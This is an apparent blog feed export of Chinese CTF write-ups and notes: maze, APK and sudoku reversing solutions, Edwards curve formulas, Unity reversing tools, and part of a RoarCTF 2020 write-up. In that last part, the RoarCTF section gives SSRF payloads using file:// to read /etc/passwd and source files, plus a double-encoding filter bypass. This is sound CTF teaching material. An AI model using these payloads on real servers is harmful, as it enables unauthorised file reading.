class="number">256</span>]; <span class="comment">// [sp+8h] [bp-230h]@1</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">256</span>]; <span class="comment">// [sp+108h] [bp-130h]@1</span></span><br><span class="line">  <span class="keyword">int</span> data; <span class="comment">// [sp+208h] [bp-30h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+20Ch] [bp-2Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+210h] [bp-28h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+214h] [bp-24h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [sp+218h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+21Ch] [bp-1Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+220h] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+224h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [sp+228h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [sp+22Ch] [bp-Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+230h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  data = <span class="number">-1341248919</span>;</span><br><span class="line">  v10 = <span class="number">1078449436</span>;</span><br><span class="line">  v11 = <span class="number">-404433706</span>;</span><br><span class="line">  v12 = <span class="number">2107721006</span>;</span><br><span class="line">  v13 = <span class="number">310654741</span>;</span><br><span class="line">  v14 = <span class="number">466487083</span>;</span><br><span class="line">  v15 = <span class="number">244438942</span>;</span><br><span class="line">  v16 = <span class="number">-1045521021</span>;</span><br><span class="line">  v17 = <span class="number">-1205263960</span>;</span><br><span class="line">  v18 = <span class="number">136611182</span>;</span><br><span class="line">  v19 = <span class="number">31438528</span>;</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  printf_(<span class="string">&quot;Do you wanna play a game?\n&quot;</span>);</span><br><span class="line">  printf_(<span class="string">&quot;Let&#x27;s play escape game where you have to find a way out. Please enter your way:&quot;</span>);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, input, <span class="number">256</span>);</span><br><span class="line">  x = <span class="number">3</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">34</span> )</span><br><span class="line">    <span class="keyword">goto</span> _Failed;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    c = input[i];</span><br><span class="line">    <span class="keyword">switch</span> ( c )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">        len = j;</span><br><span class="line">        <span class="keyword">if</span> ( byte_404018[<span class="number">4</span> * (x + <span class="number">8</span> * j)] != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> _Failed;</span><br><span class="line">        --j;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        len = j;</span><br><span class="line">        <span class="keyword">if</span> ( byte_404019[<span class="number">4</span> * (x + <span class="number">8</span> * j)] != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> _Failed;</span><br><span class="line">        ++j;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">        len = j;</span><br><span class="line">        <span class="keyword">if</span> ( byte_40401A[<span class="number">4</span> * (x + <span class="number">8</span> * j)] != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> _Failed;</span><br><span class="line">        --x;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> ( c != <span class="string">&#x27;R&#x27;</span> )</span><br><span class="line">          <span class="keyword">goto</span> _Failed;</span><br><span class="line">        len = j;</span><br><span class="line">        <span class="keyword">if</span> ( byte_40401B[<span class="number">4</span> * (x + <span class="number">8</span> * j)] != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> _Failed;</span><br><span class="line">        ++x;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; <span class="number">34</span> );</span><br><span class="line">  <span class="keyword">if</span> ( x != <span class="number">4</span> || j != <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">_Failed:</span><br><span class="line">    printf_(<span class="string">&quot;You&#x27;re stuck!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( decrypt((<span class="keyword">int</span>)flag, (<span class="keyword">int</span>)&amp;data, len, (<span class="keyword">int</span>)input) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  printf_(<span class="string">&quot;Escaped! You see the flag\n&quot;</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(<span class="number">0xC8</span>u);</span><br><span class="line">    printf_(<span class="string">&quot;%c&quot;</span>, flag[v5++]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt;= <span class="number">44</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>信息：</p><p>迷宫起点(3,0)，终点(4,7)，大小8*8，只允许四个方向键-上(U)下(D)左(L)右(R)，每个格子由代表4个方向的4个字节构成，1表示对应方向通，0表示对应方向不通，最大步数为34，求路径。</p><p>在<code>0x404018</code>处可以导出迷宫数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 01 00 01 00 01 01 01 00 00 01 01 01 00 01 01</span><br><span class="line">00 01 01 00 00 01 00 01 00 01 01 00 00 01 00 00</span><br><span class="line">01 00 00 00 01 00 00 01 00 00 01 01 00 01 01 00</span><br><span class="line">01 01 00 00 01 00 00 00 01 01 00 00 01 01 00 00</span><br><span class="line">00 01 00 01 00 00 01 01 00 00 01 01 01 00 01 00</span><br><span class="line">01 00 00 01 00 01 01 00 01 00 00 01 01 01 01 00</span><br><span class="line">01 00 00 01 00 01 01 00 00 01 00 01 00 00 01 01</span><br><span class="line">00 01 01 00 01 01 00 00 00 01 00 01 01 00 01 00</span><br><span class="line">00 01 00 01 01 00 01 00 01 00 00 01 00 01 01 00</span><br><span class="line">01 01 00 00 01 01 00 00 01 00 00 01 00 01 01 00</span><br><span class="line">01 01 00 00 00 01 00 01 00 00 01 01 01 00 01 00</span><br><span class="line">01 01 00 00 01 01 00 00 00 01 00 01 01 00 01 00</span><br><span class="line">01 01 00 00 01 00 00 01 00 01 01 00 00 01 00 01</span><br><span class="line">01 00 01 00 01 01 00 00 01 00 00 01 00 01 01 00</span><br><span class="line">01 00 00 01 00 00 01 01 01 00 01 00 01 00 00 01</span><br><span class="line">00 01 01 00 01 00 00 01 00 00 01 01 01 00 01 00</span><br></pre></td></tr></table></figure><p>可在纸上复现迷宫，正常走出路径，nc提交得flag。</p><p>​    </p><h3 id="Matara-Okina"><a href="#Matara-Okina" class="headerlink" title="Matara Okina"></a>Matara Okina</h3><blockquote><p><a href="https://ctfshow.lanzous.com/i4PQEkn6vch">https://ctfshow.lanzous.com/i4PQEkn6vch</a></p></blockquote><p>apk分析。</p><p>jadx逆向分析源码，找到FlagActivity，根据结果字符串<code>@lgvjocWzihodmXov[EWO</code>和算法逆出原始字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ans=<span class="string">b&#x27;@lgvjocWzihodmXov[EWO&#x27;</span></span><br><span class="line">ans=<span class="built_in">list</span>(ans)</span><br><span class="line">secret=[<span class="number">0</span>]*<span class="number">21</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(secret)//<span class="number">2</span>:</span><br><span class="line">j=i+<span class="number">1</span></span><br><span class="line">secret[i]^=j</span><br><span class="line">x=<span class="built_in">len</span>(secret)-<span class="number">1</span>-i</span><br><span class="line">secret[x]^=j</span><br><span class="line">i=j</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">secret[i]=ans[i]^(i+<span class="number">1</span>)</span><br><span class="line">secret[<span class="number">20</span>-i]=ans[<span class="number">20</span>-i]^(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">secret[<span class="number">10</span>]=ans[<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(secret))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Android_scheme_is_FUN</span></span><br></pre></td></tr></table></figure><p>得到的只是<code>secret</code>部分，需提交<code>data</code>，</p><p>注意到<code>paramBundle=getIntent().getData()</code>且<code>paramBundle</code>具有<code>getScheme()</code>和<code>getHost()</code>方法，了解知为Android业务组件<strong>URL Scheme</strong>，到<code>AndroidManifest.xml</code>中查看，发现</p><p><code>&lt;data android:host=&quot;p4th&quot; android:path=&quot;/70/1nput android:scheme=&quot;sh0w&quot;&gt;</code></p><p>构造出链接<code>&lt;a href=&quot;sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN&quot;&gt;打开APP&lt;/a&gt;</code>，调试出flag。</p><p>​    </p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>IDA分析，输入flag长度为48，再把<code>byte_40A0</code>数组中的<code>0xFF</code>依次替换为48个值，最后16×16矩阵检测每行、每列以及每个4×4块是否满足0-15共16个值。</p><p>原始<code>byte_40A0</code>数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">08 0E FF 0C 09 0D FF 01  0A 0F 03 0B 00 02 FF 04</span><br><span class="line">01 06 03 02 05 0A 07 00  08 09 FF 04 0F 0E 0B 0D</span><br><span class="line">0A 00 FF 0D 04 0F 03 0B  07 05 0E 02 06 08 0C 01</span><br><span class="line">04 0B 05 0F FF 02 FF 0C  06 0D 01 00 FF 0A 03 09</span><br><span class="line">02 0A FF 03 0D 00 0B 05  0C FF 09 01 FF 0F 07 0E</span><br><span class="line">0D 07 0C 0B 0F 0E 0A 08  00 FF 05 03 09 06 01 02</span><br><span class="line">FF 01 0F FF 0C 09 04 06  02 0E 0D FF FF 03 0A FF</span><br><span class="line">09 04 06 0E 02 07 01 03  0B 08 0A 0F 05 FF 00 0C</span><br><span class="line">FF 03 0A 07 0E 08 0C 04  09 FF 00 0D 02 FF 06 FF</span><br><span class="line">0C 09 01 FF 0B 03 0F 0D  0E 0A FF FF 08 00 04 07</span><br><span class="line">06 0D 00 08 0A 01 02 FF  FF 07 04 05 0C 0B FF 0F</span><br><span class="line">0B 02 0E FF 00 FF 05 FF  0F 01 FF 0C 0A 09 0D 03</span><br><span class="line">FF 0F 0B FF 03 0C FF 0E  05 FF FF 09 FF 04 08 0A</span><br><span class="line">0E 08 FF FF 07 05 0D 0F  04 03 FF FF 01 0C 09 00</span><br><span class="line">FF 05 0D 09 06 04 08 0A  01 0C 0F 0E FF 07 02 0B</span><br><span class="line">03 FF 04 0A FF 0B 09 02  0D 00 FF 08 0E FF 0F 06</span><br></pre></td></tr></table></figure><p>从前面代码逻辑推测为十六宫格填充，<code>0xFF</code>为需要填充的数字，填入后逐个取出即为flag。</p><p>利用excel，填充结果：</p><p><img src="/match-CTFshow-大吉大利杯DJBCTF/image-20210125233625306.png" alt="image-20210125233625306"></p><p>逐个取出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x =[<span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> x:</span><br><span class="line"><span class="keyword">if</span> k+<span class="number">48</span>&gt;<span class="number">47</span> <span class="keyword">and</span> k+<span class="number">48</span>&lt;=<span class="number">57</span>:</span><br><span class="line">flag+=<span class="built_in">chr</span>(k+<span class="number">48</span>)</span><br><span class="line"><span class="keyword">elif</span> k+<span class="number">87</span>&gt;<span class="number">96</span> <span class="keyword">and</span> k+<span class="number">87</span>&lt;=<span class="number">102</span>:</span><br><span class="line">flag+=<span class="built_in">chr</span>(k+<span class="number">87</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag+=<span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;比赛：CTFshow 大吉大利杯&lt;br&gt;简称：大吉杯 DJB&lt;br&gt;平台：&lt;a href=&quot;https://ctf.sho/&quot;&gt;https://ctf.sho&lt;/a&gt;w&lt;br&gt;开始：2021/1/23 9:00&lt;br&gt;结束：2021/1/24 22</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>曲线</title>
    <link href="https://lazzzaro.github.io/2021/01/20/crypto-%E6%9B%B2%E7%BA%BF/"/>
    <id>https://lazzzaro.github.io/2021/01/20/crypto-%E6%9B%B2%E7%BA%BF/</id>
    <published>2021-01-20T12:17:07.000Z</published>
    <updated>2021-01-20T13:04:26.890Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>数据库：<a href="https://www.hyperelliptic.org/EFD/">https://www.hyperelliptic.org/EFD/</a></p><p>​    </p><h3 id="Edwards-Curves"><a href="#Edwards-Curves" class="headerlink" title="Edwards Curves"></a>Edwards Curves</h3><p><strong>一般方程</strong>：$x^2+y^2=c^2(1+dx^2y^2)$</p><p><strong>加法</strong>：$(x_1,y_1)+(x_2,y_2)=(\cfrac{x_1y_2+y_1x_2}{c(1+dx_1x_2y_1y_2)},\cfrac{y_1y_2-x_1x_2}{c(1-dx_1x_2y_1y_2)})$</p><p><strong>倍乘</strong>：$2(x_1,y_1)=(\cfrac{2x_1y_1}{c(1+dx_1^2y_1^2)},\cfrac{y_1^2-x_1^2}{c(1-dx_1^2y_1^2)})$</p><p><strong>取反</strong>：$-(x_1,y_1)=(-x_1,y_1)$</p><p>​    </p><h3 id="Twisted-Edwards-Curves"><a href="#Twisted-Edwards-Curves" class="headerlink" title="Twisted Edwards Curves"></a>Twisted Edwards Curves</h3><p><strong>一般方程</strong>：</p><p>$ax^2+y^2=1+dx^2y^2$</p><p><strong>加法</strong>：</p><p>$(x_1,y_1)+(x_2,y_2)=(\cfrac{x_1y_2+y_1x_2}{1+dx_1x_2y_1y_2},\cfrac{y_1y_2-ax_1x_2}{1-dx_1x_2y_1y_2})$</p><p><strong>倍乘</strong>：</p><p>$2(x_1,y_1)=(\cfrac{2x_1y_1}{1+dx_1^2y_1^2},\cfrac{y_1^2-ax_1^2}{1-dx_1^2y_1^2})$</p><p><strong>取反</strong>：</p><p>$-(x_1,y_1)=(-x_1,y_1)$</p><p>​    </p><h3 id="Binary-Edwards-Curves"><a href="#Binary-Edwards-Curves" class="headerlink" title="Binary Edwards Curves"></a>Binary Edwards Curves</h3><p><strong>一般方程</strong>：</p><p>$d_1(x+y)+d_2(x^2+y^2)=(x+x^2)(y+y^2)$</p><p><strong>加法</strong>：</p><p>$(x_1,y_1)+(x_2,y_2)=(\cfrac{d_1(x_1+x_2)+d_2(x_1+y_1)(x_2+y_2)+(x_1+x_1^2)[x_2(y_1+y_2+1)+y_1y_2]}{d_1+(x_1+x_1^2)(x_2+y_2)},\cfrac{d_1(y_1+y_2)+d_2(x_1+y_1)(x_2+y_2)+(y_1+y_1^2)[y_2(x_1+x_2+1)+x_1x_2]}{d_1+(y_1+y_1^2)(x_2+y_2)})$</p><p><strong>倍乘</strong>：</p><p>$2(x_1,y_1)=(\cfrac{2d_1x_1+d_2(x_1+y_1)^2+(x_1+x_1^2)[x_1(2y_1+1)+y_1^2]}{d_1+(x_1+x_1^2)(x_1+y_1)},\cfrac{2d_1y_1+d_2(x_1+y_1)^2+(y_1+y_1^2)[y_1(2x_1+1)+x_1^2]}{d_1+(y_1+y_1^2)(x_1+y_1)})$</p><p><strong>取反</strong>：</p><p>$-(x_1,y_1)=(y_1,x_1)$</p><p><strong>映射</strong>：</p><p>$v^2+uv=u^3+(d_1^2+d_2)u^2+d_1^4(d_1^4+d_1^2+d_2^2)$</p><p>其中</p><p>$u=d_1(d_1^2+d_1+d_2)(x+y)/(xy+d_1(x+y)),\\v=d_1(d_1^2+d_1+d_2)(x/(xy+d_1(x+y))+d_1+1)$</p><p><strong>参考</strong>：</p><p><a href="https://eprint.iacr.org/2008/171.pdf">Binary Edwards Curves</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;数据库：&lt;a href=&quot;https://www.hyperelliptic.org/EFD/&quot;&gt;https://www.hyperelliptic.org/EFD/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​    &lt;/p&gt;
&lt;h3 id=&quot;Edwards-Cur</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="曲线" scheme="https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"/>
    
  </entry>
  
  <entry>
    <title>Unity逆向</title>
    <link href="https://lazzzaro.github.io/2020/12/13/reverse-Unity%E9%80%86%E5%90%91/"/>
    <id>https://lazzzaro.github.io/2020/12/13/reverse-Unity%E9%80%86%E5%90%91/</id>
    <published>2020-12-13T12:28:32.000Z</published>
    <updated>2021-04-13T17:08:18.357Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li><p><strong>Unity Dll逆向</strong></p><p>一般的 Unity3D 游戏的主逻辑都在 <code>Assembly-CSarp.dll</code> 中，所以需要 <code>dll文件逆向/重新打包</code> 工具。Unity3D开发的游戏，其核心代码都在这个 dll 文件中，所以逆向/修改这个 dll 文件就可以了。</p><ul><li><p><a href="https://github.com/icsharpcode/ILSpy">ILSpy</a></p><p>用于查看dll程序逻辑。</p></li><li><p>ILDASM</p><p>用于反编译dll文件，生成il文件(存放了dll反编译后的指令)和res文件(反编译后的资源文件)，可以安装Windows SDK或者从网上下载。</p></li><li><p>ilasm</p><p>.NET4.0自带，位置在 <code>C:\Windows\Microsofr.NET\Framework\v4.0.30319\ilasm.exe</code>。</p></li></ul></li><li><p><strong>Unity il2cpp逆向</strong></p><p>Unity 程序为了防止大量的外挂和盗版游戏，推出了一种 <strong>il2cpp</strong> 的操作，大概就是让 C# 的中间代码 IL 转换成 C++ 来编译，最后生成汇编程序使得反编译难度大大增加。</p><ul><li><p><a href="https://github.com/Perfare/Il2CppDumper/?fileGuid=pptwRgwDpc6HQr39">Il2CppDumper</a></p><p>还原DLL文件（不包含代码），可用于提取<code>MonoBehaviour</code>和<code>MonoScript</code></p><p><strong>使用方法</strong></p><p>直接运行Il2CppDumper.exe并依次选择il2cpp的可执行文件和global-metadata.dat文件，然后根据提示输入相应信息。程序运行完成后将在当前运行目录下生成输出文件。</p><p><strong>命令</strong></p><p><code>Il2CppDumper.exe &lt;executable-file&gt; &lt;global-metadata&gt; &lt;output-directory&gt;</code></p><p><strong>输出文件</strong></p><p>DummyDll </p><p>文件夹，包含所有还原的DLL文件。使用dnSpy，ILSpy或者其他.Net反编译工具即可查看具体信息，可用于提取Unity的MonoBehaviour和MonoScript，适用于UtinyRipper或者UABE等</p><p>ida.py<br>用于IDA</p><p>ida_with_struct.py<br>用于IDA, 读取il2cpp.h文件并在IDA中应用结构信息</p><p>il2cpp.h<br>包含结构体的头文件</p><p>ghidra.py<br>用于Ghidra</p><p>script.json<br>用于IDA和Ghidra脚本</p><p>stringliteral.json<br>包含所有stringLiteral信息</p></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;h3 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Unity Dll逆向&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一般的 Unity3D </summary>
      
    
    
    
    <category term="reverse" scheme="https://lazzzaro.github.io/categories/reverse/"/>
    
    
    <category term="Unity" scheme="https://lazzzaro.github.io/tags/Unity/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF 2020</title>
    <link href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/"/>
    <id>https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/</id>
    <published>2020-12-06T13:10:56.000Z</published>
    <updated>2020-12-12T13:36:47.734Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>由嘶吼主办的2020 RoarCTF线上赛，平台：<a href="https://ctf.4hou.com/。">https://ctf.4hou.com/。</a></p><p>Rank: 27</p><p>赛后无环境复现，故每题未写上flag值。</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>不属于Misc分类也不像签到题的签到题。</p><p>F12查看源码，发现<code>/?url</code>，需要GET方式传<code>url</code>。</p><p>尝试目录穿越及远程请求数据无效，发现file伪协议<code>/?url=file:///etc/passwd</code>能成功回显内容，</p><p>读<code>index.php</code>源码：<code>/?url=file:///var/www/html/index.php</code>，内容为PHP curl实现，过滤了<code>flag</code>关键字。</p><p>利用PHP的二次编码解析bug（<a href="https://bugs.php.net/bug.php?id=76671">bypass strpos verification</a>）编码即可绕过过滤：</p><p>Payload:<code>/?url=file:///fla%2567</code></p><p>​    </p><h3 id="Hi-433MHz"><a href="#Hi-433MHz" class="headerlink" title="Hi_433MHz"></a>Hi_433MHz</h3><p>RF射频信号数据，以原始数据方式导入Audacity查看波形，放大，</p><p>发现摩斯密码，对照可能的<code>flag</code>字符串摩斯密码<code>--..--./--.--../--....-/--..---</code>，开头四段去掉前后的<code>.</code>是吻合的，手工记录所有段解密得flag。</p><p>​    </p><h3 id="FM"><a href="#FM" class="headerlink" title="FM"></a>FM</h3><p>FM调频信号数据，以原始数据方式导入Audacity查看波形未查出有用信息。</p><p>搜索可查看FM信号的软件，首先尝试用SDR#打开，设定好2MHz的采样率，调整频率至幅值最高处，能勉强听到人声，但噪声太大，官方原生版SDR#也未找到比较好的去噪滤波功能。</p><p>换一个软件，找到Windows平台SDR软件全家桶<strong>PothosSDR</strong>，使用里面的GQRX SDR分析，功能齐全，导入后调整 Mode=Narrow FM 及 Filter width=Wide，可以清晰听出内容，报的就是flag。</p><p><img src="/match-RoarCTF-2020/fm-GQRX SDR.png" alt="fm-GQRX SDR" style="zoom:67%;" /></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-System"><a href="#Crypto-System" class="headerlink" title="Crypto_System"></a>Crypto_System</h3><p>从<a href="http://ctfteam.com/writeup/8/Too%20Secure">CyBRICS 2020 - Too Secure</a>魔改的Pedersen加密，算法描述：</p><p><img src="/match-RoarCTF-2020/CyBRICS 2020-Too Secure.png" alt="CyBRICS 2020-Too Secure" style="zoom: 80%;" /></p><p>已知信息 $m_1,m_2$和 $m_1$ 的 $r_1$，$m_1$ 通过因子 $r_1$ 加密得到 $c_1$，需要求出因子 $r_2$，使得 $m_2$ 通过 $r_2$ 加密得到的 $c_2$ 与 $c_1$ 相同，即产生碰撞。</p><p>对于待加密信息 $m_1$，$c_1=g^{m_1}h_1^{r_1}$，注意到 $h_1=g^{a_1}$，故 $c_1=g^{m_1+a_1r_1}$；</p><p>要碰撞信息 $m_2$ 的因子 $r_2$ 应满足 $c_2=c_1$，即 $m_1+a_1r_1 \equiv m_2+a_2r_2 \pmod {\varphi(p)}$，</p><p>又 $q$ 为 $g$ 的阶，所以有 $m_1+a_1r_1 \equiv m_2+a_2r_2 \pmod q$，</p><p>故 $r_2 \equiv (m_1+a_1r_1-m_2) \pmod q$，即可求出 $r_2$。</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> 